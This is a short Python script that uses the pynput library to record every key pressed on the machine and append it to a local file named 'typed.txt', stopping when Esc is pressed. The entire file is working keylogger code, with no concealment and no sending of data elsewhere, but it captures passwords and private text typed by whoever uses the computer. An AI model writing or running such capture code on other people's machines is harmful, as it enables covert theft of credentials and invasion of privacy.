from pynput.keyboard import Key, Listener #import the pynput lib.

def on_press(key):
    if key == Key.esc:
    # Stop listener
        return False
    if key == Key.enter: #if the key is 'enter' will give a linebreak
        key = str(key)
        key = "\n"
    else:
        key = str(key) #otherwise will give 'key' the string value of the pressed key.
        
    print(key)
    arq = open('typed.txt', 'a') #will make a log file of everthing that was typed.
    key = key.replace("'","")
    if "." in key:
        arq.write("\n")
    arq.write(key)
    key = key.replace(" pressed", "")
    arq.close()

# Collect events until released
with Listener(on_press=on_press) as listener:
    listener.join()
